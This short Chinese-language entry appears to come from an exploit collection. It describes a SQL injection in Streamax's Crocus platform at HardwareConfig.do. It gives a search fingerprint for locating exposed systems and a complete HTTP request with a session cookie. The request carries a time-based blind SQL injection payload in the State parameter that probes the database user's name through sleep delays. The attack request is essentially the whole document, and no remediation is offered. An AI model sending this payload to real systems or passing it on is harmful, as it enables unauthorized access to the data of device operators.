# 锐明技术CrocusHardwareConfig存在SQLl注入漏洞

- **系统**：锐明技术　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`product="Crocus"`

**请求体 / payload**
```
PPOST /HardwareConfig.do?Action=ReadTask HTTP/1.1
Host:
Cookie: Saffron.U=VUlEPTEmR0lEPTE3NTk4MTczMjgyMzg0NyZSSUQ9MSZNPUdNYXAmSU5TPTA=
Content-Type: application/x-www-form-urlencoded
PageIndex=0&PageSize=10&State=(select*from(select%0acase%0awhen%0aascii(substr(current_user,1,1))>1%0athen%0asleep(5)%0aelse%0a0%0aend)a)
```
- **预期**：200　|　—